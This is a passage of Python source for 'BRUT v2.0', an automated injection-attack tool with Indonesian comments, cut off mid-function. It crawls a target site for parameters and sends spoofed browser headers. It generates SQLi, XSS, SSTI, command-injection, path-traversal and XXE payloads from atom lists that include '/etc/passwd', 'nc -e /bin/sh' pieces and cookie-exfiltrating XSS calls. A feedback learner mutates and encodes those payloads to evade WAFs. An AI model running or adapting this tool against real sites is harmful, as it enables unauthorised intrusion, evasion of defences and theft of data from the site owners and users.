#!/usr/bin/env python3
"""
BRUT v2.0 - Advanced ML-Driven Payload Injection Testing Framework
====================================================================
Upgrades:
- Enhanced ML payload generation with feedback learning
- Detailed logging: payload, response, status code meaning, response time
- Adaptive payload building based on server feedback
- More advanced mutation/obfuscation techniques
- Real-time learning from every response
"""

import os
import sys
import json
import time
import re
import random
import string
import hashlib
import base64
import subprocess
import warnings
import itertools
import traceback
from datetime import datetime
from urllib.parse import (
    urlparse, urljoin, parse_qs, urlencode,
    quote, quote_plus, unquote
)
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field, asdict
from collections import Counter, defaultdict

warnings.filterwarnings("ignore")

# ============================================================
# HTTP STATUS CODE MEANINGS
# ============================================================
STATUS_MEANINGS = {
    0: "No Response (Connection Failed)",
    100: "Continue",
    200: "OK - Request Successful",
    201: "Created - Resource Created",
    204: "No Content - Success but no body",
    301: "Moved Permanently (Redirect)",
    302: "Found (Temporary Redirect)",
    303: "See Other (Redirect)",
    304: "Not Modified (Cached)",
    307: "Temporary Redirect",
    308: "Permanent Redirect",
    400: "Bad Request - Invalid Input",
    401: "Unauthorized - Auth Required",
    403: "Forbidden - Access Denied (WAF?)",
    404: "Not Found - Resource Missing",
    405: "Method Not Allowed",
    406: "Not Acceptable",
    408: "Request Timeout",
    413: "Payload Too Large",
    414: "URI Too Long",
    415: "Unsupported Media Type",
    422: "Unprocessable Entity",
    429: "Too Many Requests (Rate Limited)",
    431: "Request Headers Too Large",
    451: "Unavailable For Legal Reasons",
    500: "Internal Server Error (Possible Injection!)",
    501: "Not Implemented",
    502: "Bad Gateway",
    503: "Service Unavailable",
    504: "Gateway Timeout",
    520: "Unknown Error (Cloudflare)",
    521: "Web Server Down (Cloudflare)",
    522: "Connection Timed Out (Cloudflare)",
    523: "Origin Unreachable (Cloudflare)",
}

def get_status_meaning(code: int) -> str:
    return STATUS_MEANINGS.get(code, f"Unknown Status ({code})")


# ============================================================
# DEPENDENCY MANAGEMENT
# ============================================================
REQUIRED_DEPS = [
    ("numpy", "numpy", "Numerical computing", False),
    ("scipy", "scipy", "Scientific computing", False),
    ("sklearn", "scikit-learn", "Machine learning", False),
    ("requests", "requests", "HTTP client", False),
    ("bs4", "beautifulsoup4", "HTML parsing", False),
    ("lxml", "lxml", "Fast XML/HTML parser", False),
    ("httpx", "httpx", "Modern HTTP client", False),
    ("h2", "h2", "HTTP/2 protocol support", True),
    ("aiohttp", "aiohttp", "Async HTTP client", False),
    ("selectolax", "selectolax", "Fast HTML parser", True),
    ("playwright", "playwright", "Headless browser", True),
    ("tldextract", "tldextract", "Domain extraction", False),
    ("fake_useragent", "fake-useragent", "UA rotation", True),
]


def install_dependencies():
    """Cek dan install dependencies otomatis."""
    print("\n\033[36m" + "=" * 60)
    print("  BRUT v2.0: Dependency Manager")
    print("=" * 60 + "\033[0m\n")

    missing = []
    for import_name, pip_name, desc, optional in REQUIRED_DEPS:
        try:
            __import__(import_name)
            print(f"  \033[32m[OK]\033[0m {pip_name:<22} - {desc}")
        except ImportError:
            tag = "optional" if optional else "required"
            print(f"  \033[33m[??]\033[0m {pip_name:<22} - {desc} ({tag})")
            missing.append((pip_name, optional))

    if not missing:
        print(f"\n  \033[32mSemua {len(REQUIRED_DEPS)} dependencies siap!\033[0m")
        time.sleep(0.5)
        return True

    req_count = sum(1 for _, opt in missing if not opt)
    opt_count = sum(1 for _, opt in missing if opt)
    print(f"\n  Belum terinstall: {req_count} required, {opt_count} optional")
    print(f"  Menginstall {len(missing)} packages...\n")

    failed = []
    for pip_name, optional in missing:
        print(f"  [+] Installing {pip_name}...", end=" ", flush=True)
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", pip_name,
                 "--quiet", "--disable-pip-version-check"],
                capture_output=True, text=True, timeout=180
            )
            if pip_name == "playwright":
                print("browser...", end=" ", flush=True)
                subprocess.run(
                    [sys.executable, "-m", "playwright", "install", "chromium"],
                    capture_output=True, text=True, timeout=300
                )
            print("\033[32mOK\033[0m")
        except Exception as e:
            print(f"\033[31mFAIL ({e})\033[0m")
            if not optional:
                failed.append(pip_name)

    if failed:
        print(f"\n  \033[31mGagal install required: {failed}\033[0m")
        return False

    print(f"\n  \033[32m{len(REQUIRED_DEPS)}/{len(REQUIRED_DEPS)} dependencies siap!\033[0m")
    time.sleep(0.5)
    return True


install_dependencies()

# Import dependencies
try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False; np = None

try:
    from scipy import stats as scipy_stats
    HAS_SCIPY = True
except ImportError:
    HAS_SCIPY = False

try:
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.metrics.pairwise import cosine_similarity
    from sklearn.cluster import KMeans
    HAS_SKLEARN = True
except ImportError:
    HAS_SKLEARN = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    import h2
    HAS_H2 = True
except ImportError:
    HAS_H2 = False

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    from selectolax.parser import HTMLParser as SelectoParser
    HAS_SELECTOLAX = True
except ImportError:
    HAS_SELECTOLAX = False

try:
    from playwright.sync_api import sync_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False

try:
    import tldextract
    HAS_TLDEXTRACT = True
except ImportError:
    HAS_TLDEXTRACT = False

try:
    from fake_useragent import UserAgent
    HAS_FAKE_UA = True
    UA_ROTATOR = UserAgent()
except ImportError:
    HAS_FAKE_UA = False
    UA_ROTATOR = None


# ============================================================
# BANNER
# ============================================================
def print_banner():
    banner = f"""
\033[1;36m    ____             __       ____  __ 
   / __ )_______  __/ /____  / __ \\/ / 
  / __  / ___/ / / / __/ _ \\/ /_/ / /  
 / /_/ / /  / /_/ / /_/  __/ ____/ /___
/_____/_/   \\__,_/\\__/\\___/_/   /_____/
\033[0m                                       
\033[1;33m    ═══════════════════════════════════════════════════════\033[0m
\033[1;37m      BRUT v2.0 — ML-Driven Payload Injection + Learning\033[0m
\033[1;33m    ═══════════════════════════════════════════════════════\033[0m

\033[36m    ┌───────────────────────────────────────────────────────┐\033[0m
\033[36m    │\033[0m  \033[32m●\033[0m Parameter Discovery   (URL, Form, API, JS, AJAX)  \033[36m│\033[0m
\033[36m    │\033[0m  \033[32m●\033[0m ML Payload Generator  (builds from scratch)       \033[36m│\033[0m
\033[36m    │\033[0m  \033[32m●\033[0m Feedback Learning    (adapts from server response)\033[36m│\033[0m
\033[36m    │\033[0m  \033[32m●\033[0m Stealth Injection    (httpx + Playwright)         \033[36m│\033[0m
\033[36m    │\033[0m  \033[32m●\033[0m Response Analyzer    (Server vs Raw HTML)         \033[36m│\033[0m
\033[36m    │\033[0m  \033[32m●\033[0m Auto Report Save     (TXT + JSON)                 \033[36m│\033[0m
\033[36m    └───────────────────────────────────────────────────────┘\033[0m

\033[1;35m    Mode    :\033[0m Interactive  |  \033[1;35mSpecial:\033[0m /exit, max
\033[1;35m    Length  :\033[0m short, long, super-long, ultra-long
\033[1;35m    ML      :\033[0m Adaptive feedback learning enabled
\033[1;35m    Date    :\033[0m {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    print(banner)


# ============================================================
# STEALTH HTTP CLIENT
# ============================================================
STEALTH_HEADERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]


def get_stealth_client():
    if not HAS_HTTPX:
        return None
    ua = UA_ROTATOR.random if HAS_FAKE_UA else random.choice(STEALTH_HEADERS)
    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
        "DNT": "1",
    }
    if HAS_H2:
        try:
            return httpx.Client(
                headers=headers, follow_redirects=True, timeout=30.0,
                verify=False, http2=True,
                limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
            )
        except (ImportError, Exception):
            pass
    return httpx.Client(
        headers=headers, follow_redirects=True, timeout=30.0,
        verify=False, http2=False,
        limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
    )


# ============================================================
# PARAMETER DISCOVERY
# ============================================================
@dataclass
class Parameter:
    name: str
    location: str
    method: str = "GET"
    url: str = ""
    original_value: str = ""
    input_type: str = "text"
    form_action: str = ""
    form_id: str = ""
    context: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self):
        return asdict(self)


class ParameterDiscovery:
    def __init__(self, target: str):
        self.target = target
        self.parsed = urlparse(target)
        self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.domain = self.parsed.netloc
        self.parameters: List[Parameter] = []
        self.visited_urls = set()
        self.client = get_stealth_client()

    def run(self) -> List[Parameter]:
        print(f"\n\033[36m[*]\033[0m Starting parameter discovery on: \033[1;37m{self.target}\033[0m")
        self._extract_url_params()
        html = self._fetch_page(self.target)
        if not html:
            print(f"\033[31m[!]\033[0m Tidak bisa fetch target")
            return []
        self._extract_form_params(html)
        self._extract_hidden_params(html)
        self._extract_js_endpoints(html)
        self._crawl_links(html)
        self._guess_api_params()
        # Deduplicate
        seen = set()
        unique = []
        for p in self.parameters:
            key = f"{p.location}:{p.name}:{p.method}:{p.url}"
            if key not in seen:
                seen.add(key)
                unique.append(p)
        self.parameters = unique
        return self.parameters

    def _fetch_page(self, url: str) -> Optional[str]:
        try:
            if self.client:
                resp = self.client.get(url)
                if resp.status_code < 400:
                    return resp.text
        except Exception:
            pass
        try:
            if HAS_REQUESTS:
                headers = {"User-Agent": random.choice(STEALTH_HEADERS)}
                resp = requests.get(url, headers=headers, timeout=20, verify=False)
                if resp.status_code < 400:
                    return resp.text
        except Exception:
            pass
        return None

    def _extract_url_params(self):
        if self.parsed.query:
            params = parse_qs(self.parsed.query)
            for name, values in params.items():
                self.parameters.append(Parameter(
                    name=name, location="url_query", method="GET",
                    url=self.target.split("?")[0],
                    original_value=values[0] if values else "",
                ))

    def _extract_form_params(self, html: str):
        if not HAS_BS4:
            return
        soup = BeautifulSoup(html, "html.parser")
        for form in soup.find_all("form"):
            action = form.get("action", "")
            form_url = urljoin(self.target, action) if action else self.target
            method = form.get("method", "GET").upper()
            form_id = form.get("id", "") or form.get("name", "")
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name", "")
                if not name:
                    continue
                inp_type = inp.get("type", "text")
                if inp_type in ["submit", "button", "image", "reset"]:
                    continue
                loc = "hidden" if inp_type == "hidden" else "form_input"
                self.parameters.append(Parameter(
                    name=name, location=loc, method=method, url=form_url,
                    original_value=inp.get("value", ""), input_type=inp_type,
                    form_action=action, form_id=form_id,
                    context={"form_id": form_id, "input_type": inp_type},
                ))

    def _extract_hidden_params(self, html: str):
        meta_match = re.findall(r'<meta[^>]+content="[^"]*[?&]([^=&"]+)=', html, re.I)
        for name in meta_match:
            self.parameters.append(Parameter(
                name=name, location="hidden", method="GET", url=self.target))
        comments = re.findall(r'<!--(.*?)-->', html, re.S)
        param_pattern = re.compile(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=')
        for comment in comments:
            for match in param_pattern.findall(comment):
                self.parameters.append(Parameter(
                    name=match, location="hidden", method="GET",
                    url=self.target, context={"source": "comment"}))

    def _extract_js_endpoints(self, html: str):
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.S | re.I)
        url_patterns = [
            r'["\'](/[a-zA-Z0-9_/-]+\?[a-zA-Z_][a-zA-Z0-9_]*=)["\']',
            r'fetch\s*$\s*["\']([^"\']+\?[^"\']+)["\']',
            r'\.ajax\s*$\s*\{[^}]*url:\s*["\']([^"\']+)["\']',
            r'axios\.[a-z]+\s*$\s*["\']([^"\']+)["\']',
            r'XMLHttpRequest[^;]*open\s*$[^,]+,\s*["\']([^"\']+)["\']',
        ]
        for script in scripts:
            for pattern in url_patterns:
                for match in re.findall(pattern, script):
                    full_url = urljoin(self.target, match)
                    parsed = urlparse(full_url)
                    if parsed.query:
                        params = parse_qs(parsed.query)
                        for name in params:
                            self.parameters.append(Parameter(
                                name=name, location="ajax", method="GET",
                                url=full_url.split("?")[0],
                                original_value=params[name][0] if params[name] else "",
                                context={"source": "js_endpoint"}))

    def _crawl_links(self, html: str):
        if not HAS_BS4:
            return
        soup = BeautifulSoup(html, "html.parser")
        links = soup.find_all("a", href=True)
        param_links = []
        for link in links[:30]:
            href = link["href"]
            full_url = urljoin(self.target, href)
            parsed = urlparse(full_url)
            if parsed.netloc == self.parsed.netloc and parsed.query:
                param_links.append(full_url)
        for link_url in param_links[:10]:
            parsed = urlparse(link_url)
            params = parse_qs(parsed.query)
            for name, values in params.items():
                self.parameters.append(Parameter(
                    name=name, location="url_query", method="GET",
                    url=link_url.split("?")[0],
                    original_value=values[0] if values else "",
                    context={"source": "crawled_link"}))

    def _guess_api_params(self):
        common_params = ["id", "user", "q", "search", "page", "limit", "filter", "sort"]
        if not self.parameters:
            for param in common_params[:3]:
                self.parameters.append(Parameter(
                    name=param, location="guessed", method="GET",
                    url=self.target, context={"source": "common_pattern"}))


# ============================================================
# FEEDBACK LEARNER — ML learns from every server response
# ============================================================
class FeedbackLearner:
    """
    ML component yang belajar dari setiap feedback server.
    Menyesuaikan strategi payload berdasarkan respon.
    """

    def __init__(self):
        # Tracking kategori success/fail
        self.category_scores = defaultdict(lambda: {"success": 0, "fail": 0, "raw_html": 0, "blocked": 0})
        # Tracking encoding success/fail
        self.encoding_scores = defaultdict(lambda: {"success": 0, "fail": 0})
        # Tracking length tier success/fail
        self.tier_scores = defaultdict(lambda: {"success": 0, "fail": 0})
        # Tracking strategy success/fail
        self.strategy_scores = defaultdict(lambda: {"success": 0, "fail": 0})
        # WAF detection
        self.waf_detected = False
        self.waf_type = ""
        self.waf_signatures = []
        # Blocked patterns (what triggers WAF)
        self.blocked_patterns = []
        # Successful patterns (what gets through)
        self.successful_patterns = []
        # Server tech detection
        self.server_tech = {"language": "", "framework": "", "database": ""}
        # Response time baseline
        self.response_times = []
        self.baseline_response_time = 0
        # Adaptive weights
        self.category_weights = {
            "sqli": 0.35, "xss": 0.25, "ssti": 0.15,
            "cmdi": 0.10, "lfi": 0.10, "xxe": 0.02,
            "crlf": 0.02, "redirect": 0.01
        }
        # Learning rate
        self.lr = 0.15
        # History of all interactions
        self.history = []

    def record_feedback(self, payload_dict: Dict, result: 'InjectionResult'):
        """Record feedback dari satu injection attempt."""
        cat = payload_dict.get("category", "unknown")
        encoding = payload_dict.get("encoding", "raw")
        tier = payload_dict.get("length_tier", "short")
        strategy = payload_dict.get("strategy", "unknown")
        resp_type = result.response_type
        status = result.status_code
        resp_time = result.response_time_ms
        resp_text = result.evidence

        # Record response time
        if resp_time > 0:
            self.response_times.append(resp_time)
            if len(self.response_times) >= 10:
                self.baseline_response_time = sum(self.response_times[-50:]) / len(self.response_times[-50:])

        # Update category scores
        if resp_type == "server_output":
            self.category_scores[cat]["success"] += 1
            self.encoding_scores[encoding]["success"] += 1
            self.tier_scores[tier]["success"] += 1
            self.strategy_scores[strategy]["success"] += 1
            self.successful_patterns.append({
                "category": cat, "encoding": encoding, "tier": tier,
                "strategy": strategy, "payload": payload_dict.get("payload", "")[:100],
                "evidence": resp_text[:100]
            })
        elif resp_type == "raw_html":
            self.category_scores[cat]["raw_html"] += 1
            self.encoding_scores[encoding]["fail"] += 1
        elif resp_type == "blocked":
            self.category_scores[cat]["blocked"] += 1
            self.blocked_patterns.append({
                "category": cat, "encoding": encoding,
                "payload_snippet": payload_dict.get("payload", "")[:50],
                "status": status
            })
            # Detect WAF
            self._detect_waf(resp_text, status)

        # Detect server technology
        self._detect_tech(resp_text, status)

        # Adjust weights adaptively
        self._adjust_weights()

        # Record history
        self.history.append({
            "category": cat, "encoding": encoding, "tier": tier,
            "response_type": resp_type, "status": status,
            "response_time": resp_time
        })

    def _detect_waf(self, evidence: str, status: int):
        """Detect WAF dari response patterns."""
        waf_signs = {
            "cloudflare": ["cloudflare", "cf-ray", "attention required"],
            "modsecurity": ["mod_security", "not acceptable", "406"],
            "incapsula": ["incapsula", "imperva"],
            "sucuri": ["sucuri", "cloudproxy"],
            "akamai": ["akamai", "reference"],
            "aws_waf": ["aws", "waf", "captcha"],
            "f5": ["f5 networks", "big-ip"],
        }
        evidence_lower = evidence.lower()
        for waf_name, signs in waf_signs.items():
            for sign in signs:
                if sign in evidence_lower:
                    self.waf_detected = True
                    self.waf_type = waf_name
                    self.waf_signatures.append(sign)

        if status in [403, 406, 429, 503]:
            self.waf_detected = True

    def _detect_tech(self, evidence: str, status: int):
        """Detect server technology dari response."""
        evidence_lower = evidence.lower()
        # Language detection
        if "php" in evidence_lower or "laravel" in evidence_lower:
            self.server_tech["language"] = "PHP"
        elif "python" in evidence_lower or "django" in evidence_lower or "flask" in evidence_lower:
            self.server_tech["language"] = "Python"
        elif "java" in evidence_lower or "spring" in evidence_lower:
            self.server_tech["language"] = "Java"
        elif "asp.net" in evidence_lower or ".net" in evidence_lower:
            self.server_tech["language"] = "ASP.NET"
        elif "node" in evidence_lower or "express" in evidence_lower:
            self.server_tech["language"] = "Node.js"
        elif "ruby" in evidence_lower or "rails" in evidence_lower:
            self.server_tech["language"] = "Ruby"

        # Database detection
        if "mysql" in evidence_lower:
            self.server_tech["database"] = "MySQL"
        elif "postgresql" in evidence_lower or "psql" in evidence_lower:
            self.server_tech["database"] = "PostgreSQL"
        elif "oracle" in evidence_lower or "ora-" in evidence_lower:
            self.server_tech["database"] = "Oracle"
        elif "sqlite" in evidence_lower:
            self.server_tech["database"] = "SQLite"
        elif "sql server" in evidence_lower or "mssql" in evidence_lower:
            self.server_tech["database"] = "MSSQL"

        # Framework
        if "django" in evidence_lower:
            self.server_tech["framework"] = "Django"
        elif "flask" in evidence_lower or "werkzeug" in evidence_lower:
            self.server_tech["framework"] = "Flask"
        elif "spring" in evidence_lower:
            self.server_tech["framework"] = "Spring"
        elif "laravel" in evidence_lower:
            self.server_tech["framework"] = "Laravel"
        elif "express" in evidence_lower:
            self.server_tech["framework"] = "Express"
        elif "rails" in evidence_lower:
            self.server_tech["framework"] = "Rails"

    def _adjust_weights(self):
        """Adjust category weights berdasarkan feedback."""
        total_success = sum(v["success"] for v in self.category_scores.values())
        if total_success == 0:
            return

        for cat, scores in self.category_scores.items():
            if cat in self.category_weights:
                success_rate = scores["success"] / max(1, scores["success"] + scores["fail"] + scores["raw_html"] + scores["blocked"])
                # Increase weight for successful categories
                if success_rate > 0.3:
                    self.category_weights[cat] += self.lr * success_rate
                # Decrease for blocked categories
                elif scores["blocked"] > scores["success"] * 3:
                    self.category_weights[cat] *= 0.8

        # Normalize weights
        total = sum(self.category_weights.values())
        if total > 0:
            for cat in self.category_weights:
                self.category_weights[cat] /= total

    def get_best_category(self) -> str:
        """Return category dengan success rate tertinggi."""
        if not self.category_scores:
            return random.choice(list(self.category_weights.keys()))

        best_cat = max(
            self.category_scores.keys(),
            key=lambda c: self.category_scores[c]["success"],
            default=random.choice(list(self.category_weights.keys()))
        )
        return best_cat

    def get_best_encoding(self) -> str:
        """Return encoding dengan success rate tertinggi."""
        if not self.encoding_scores:
            return "raw"
        best = max(
            self.encoding_scores.keys(),
            key=lambda e: self.encoding_scores[e]["success"],
            default="raw"
        )
        return best

    def get_best_tier(self) -> str:
        """Return tier dengan success rate tertinggi."""
        if not self.tier_scores:
            return "short"
        best = max(
            self.tier_scores.keys(),
            key=lambda t: self.tier_scores[t]["success"],
            default="short"
        )
        return best

    def get_adaptive_weights(self) -> List[float]:
        """Return normalized weights untuk category selection."""
        cats = ["sqli", "xss", "ssti", "cmdi", "lfi", "xxe", "crlf", "redirect"]
        return [self.category_weights.get(c, 0.01) for c in cats]

    def should_evolve(self) -> bool:
        """Check jika perlu generate lebih advanced payloads."""
        if len(self.history) < 20:
            return False
        recent = self.history[-20:]
        blocked_count = sum(1 for h in recent if h["response_type"] == "blocked")
        return blocked_count > 10

    def get_learning_summary(self) -> str:
        """Return summary dari yang sudah dipelajari."""
        lines = []
        if self.server_tech["language"]:
            lines.append(f"Server: {self.server_tech['language']}")
        if self.server_tech["framework"]:
            lines.append(f"Framework: {self.server_tech['framework']}")
        if self.server_tech["database"]:
            lines.append(f"Database: {self.server_tech['database']}")
        if self.waf_detected:
            lines.append(f"WAF: {self.waf_type or 'Detected'}")
        if self.successful_patterns:
            best_cat = self.get_best_category()
            lines.append(f"Best attack: {best_cat}")
        return " | ".join(lines) if lines else "Learning..."


# ============================================================
# ML PAYLOAD GENERATOR v2.0 — Enhanced with more techniques
# ============================================================
class MLPayloadGenerator:
    """
    ML-driven payload generator v2.0.
    - Builds from scratch using atomic composition
    - Learns from feedback (FeedbackLearner integration)
    - More mutation techniques
    - Advanced WAF bypass strategies
    """

    ATOMS = {
        "sql_string_break": ["'", '"', "`", "''", '""', "\\'", '\\"', "%27", "%22"],
        "sql_logic": ["OR", "AND", "XOR", "NOT", "&&", "||", "DIV"],
        "sql_comment": ["--", "#", "/**/", ";--", ";#", "-- -", "/*!*/", "--+", "%23"],
        "sql_keyword": ["SELECT", "UNION", "FROM", "WHERE", "SLEEP", "BENCHMARK",
                        "WAITFOR", "DELAY", "ORDER", "GROUP", "HAVING", "LIMIT",
                        "INSERT", "UPDATE", "DELETE", "DROP", "EXEC", "EXECUTE",
                        "CAST", "CONVERT", "CHAR", "CONCAT", "SUBSTRING", "ASCII"],
        "sql_func": ["CONCAT()", "CHAR()", "SUBSTRING()", "ASCII()", "LENGTH()",
                     "VERSION()", "DATABASE()", "USER()", "CURRENT_USER",
                     "LOAD_FILE()", "INTO OUTFILE", "INFORMATION_SCHEMA",
                     "COUNT(*)", "GROUP_CONCAT()", "HEX()", "UNHEX()"],
        "xss_open": ["<", "&lt;", "%3C", "\\u003c", "\\x3c", "&Tab;<", "&NewLine;<",
                     "\\00003c", "&#60;", "&#x3c;", "&lcub;", "&#0000060;"],
        "xss_tag": ["script", "img", "svg", "iframe", "body", "input", "details",
                    "video", "audio", "marquee", "math", "object", "embed",
                    "link", "meta", "base", "form", "button", "select",
                    "textarea", "style", "div", "span", "a", "p"],
        "xss_event": ["onload", "onerror", "onmouseover", "onfocus", "onblur",
                      "onanimationend", "ontransitionend", "onwheel", "onclick",
                      "onsubmit", "onchange", "oninput", "onkeydown", "onkeyup",
                      "onkeypress", "onmousedown", "onmouseup", "onmouseout",
                      "ondblclick", "oncontextmenu", "ondrag", "ondragend",
                      "ondragenter", "ondragleave", "ondragover", "ondragstart",
                      "ondrop", "onscroll", "onresize", "ontouchstart",
                      "ontouchend", "ontouchmove", "onpointerdown",
                      "onpointerup", "onanimationstart", "onanimationiteration",
                      "onafterprint", "onbeforeprint", "onbeforeunload",
                      "onhashchange", "onmessage", "onoffline", "ononline",
                      "onpagehide", "onpageshow", "onpopstate", "onstorage",
                      "onunload", "oncopy", "oncut", "onpaste",
                      "onabort", "oncanplay", "oncanplaythrough",
                      "ondurationchange", "onemptied", "onended",
                      "onloadeddata", "onloadedmetadata", "onloadstart",
                      "onpause", "onplay", "onplaying", "onprogress",
                      "onratechange", "onseeked", "onseeking", "onstalled",
                      "onsuspend", "ontimeupdate", "onvolumechange", "onwaiting",
                      "onshow", "ontoggle"],
        "xss_js": ["alert(1)", "confirm(1)", "prompt(1)", "console.log(1)",
                   "fetch('//x')", "eval('1')", "Function('1')()",
                   "alert`1`", "alert.call(null,1)", "window['alert'](1)",
                   "self['alert'](1)", "this['alert'](1)", "top['alert'](1)",
                   "document['cookie']", "location='//x'",
                   "navigator.sendBeacon('//x')", "new Image().src='//x'",
                   "setTimeout('alert(1)')", "setInterval('alert(1)')",
                   "requestAnimationFrame('alert(1)')",
                   "Promise.resolve().then(_=>alert(1))"],
        "xss_context_break": ["\">", "'>", "``>", "}}>", "])>", "/>",
                              "\"autofocus ", "' autofocus ",
                              "\" onfocus=\"", "' onfocus='"],
        "ssti_open": ["{{", "${", "#{", "<%=", "<%", "{%", "${{", "<#", "{{-", "${#",
                      "<%#", "{{{", "[[", "{#"],
        "ssti_close": ["}}", "}", "%>", "%}", "}}}", "%}}", "-}}", "]]", "#}"],
        "ssti_expr": ["7*7", "7*'7'", "range(7)", "7..7", "1+1", "'x'*7",
                      "config", "request", "self", "self.__class__",
                      "''|attr('__class__')", "().__class__", "[].__class__",
                      "cycler.__init__.__globals__", "lipsum.__globals__",
                      "namespace.__init__.__globals__",
                      "''.__class__.__mro__[1].__subclasses__()",
                      "request.application.__globals__"],
        "cmd_sep": [";", "|", "||", "&&", "&", "`", "$(", "\n", "%0a", "%0d%0a",
                    "\\\n", "|&", ";{", "$IFS", "${IFS}", "%09"],
        "cmd_exec": ["sleep", "id", "whoami", "uname", "ls", "pwd", "cat", "echo",
                     "wget", "curl", "ping", "nslookup", "dig", "nc",
                     "python", "perl", "ruby", "php", "bash", "sh",
                     "powershell", "cmd", "certutil", "bitsadmin"],
        "cmd_arg": ["5", "1", "-a", "/", "/etc/passwd", "-c 1",
                    "-n 1 127.0.0.1", "-la", "/tmp", "http://x.test",
                    "-e /bin/sh", "-i", "-p 80"],
        "path_traversal": ["../", "..\\", "....//", "..;/", "%2e%2e%2f",
                          "%252e%252e%252f", "..%252f", "..%c0%af",
                          "..%c1%9c", "..%ef%bc%8f", "..%2f",
                          "..\\\\", "..../", "..\\../",
                          "%c0%ae%c0%ae/", "%c0%ae%c0%ae\\",
                          "..%25%32%66", "..%25%35%63"],
        "null_byte": ["%00", "\\0", "\\x00", "%0a", "%0d", "\x00"],
        "whitespace": [" ", "\t", "\n", "\r", "%09", "%0a", "%0d", "/**/",
                       "/*x*/", "/**x**/", "+", "%20", "%0b", "%0c",
                       "/*!*/", "/*!50000*/"],
        "bypass_chars": ["⁄", "∕", "⁄", "⅋", "＆", "＜", "＞", "＂", "＇",
                         "‹", "›", "「", "」", "『", "』", "〈", "〉"],
    }

    CATEGORIES = ["sqli", "xss", "ssti", "cmdi", "lfi", "xxe", "crlf", "redirect"]

    def __init__(self, learner: FeedbackLearner = None):
        self.learner = learner or FeedbackLearner()
        self.generated_payloads: List[Dict] = []
        self.rng = random.Random()
        self.payload_counter = 0
        self._build_techniques()

    def _build_techniques(self):
        """Build all mutation/obfuscation techniques."""
        self.mutation_techniques = [
            self._mut_case_variation,
            self._mut_comment_injection,
            self._mut_whitespace_padding,
            self._mut_char_encoding,
            self._mut_string_concat,
            self._mut_null_byte_append,
            self._mut_unicode_normalize,
            self._mut_double_encoding,
            self._mut_html_entity_mix,
            self._mut_nested_encoding,
            self._mut_keyword_split,
            self._mut_alternative_syntax,
            self._mut_homoglyph,
            self._mut_backslash_escape,
            self._mut_newline_injection,
            self._mut_tab_separation,
            self._mut_block_comment_wrap,
            self._mut_inline_comment_split,
            self._mut_recursive_encode,
            self._mut_zero_width_insert,
        ]

    # ---- Encoding functions ----
    def _enc_raw(self, s): return s
    def _enc_url(self, s): return quote(s, safe="")
    def _enc_double_url(self, s): return quote(quote(s, safe=""), safe="")
    def _enc_triple_url(self, s): return quote(quote(quote(s, safe=""), safe=""), safe="")
    def _enc_unicode(self, s):
        return "".join(f"\\u{ord(c):04x}" if random.random() < 0.4 else c for c in s)
    def _enc_html_entity(self, s):
        methods = [
            lambda c: f"&#{ord(c)};",
            lambda c: f"&#x{ord(c):x};",
            lambda c: f"&#{ord(c):05d};",
        ]
        return "".join(random.choice(methods)(c) if random.random() < 0.4 else c for c in s)
    def _enc_hex(self, s):
        return "".join(f"\\x{ord(c):02x}" if random.random() < 0.4 else c for c in s)
    def _enc_octal(self, s):
        return "".join(f"\\{ord(c):03o}" if random.random() < 0.4 else c for c in s)
    def _enc_mixed(self, s):
        funcs = [self._enc_url, self._enc_unicode, self._enc_html_entity, self._enc_hex, self._enc_octal]
        return random.choice(funcs)(s)

    # ---- Mutation techniques ----
    def _mut_case_variation(self, s):
        return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in s)

    def _mut_comment_injection(self, s):
        comments = ["/**/", "/*!*/", "/**x**/", "/*!50000*/", "/*x*/"]
        # Insert comments between keywords
        result = s
        for kw in ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "script", "alert"]:
            if kw.lower() in result.lower():
                comment = random.choice(comments)
                result = re.sub(
                    re.escape(kw), f"{kw[:2]}{comment}{kw[2:]}",
                    result, count=1, flags=re.I
                )
        return result

    def _mut_whitespace_padding(self, s):
        ws_options = ["  ", "\t", "\n", "%09", "%0a", "%0d", "/**/", "/*x*/"]
        ws = random.choice(ws_options)
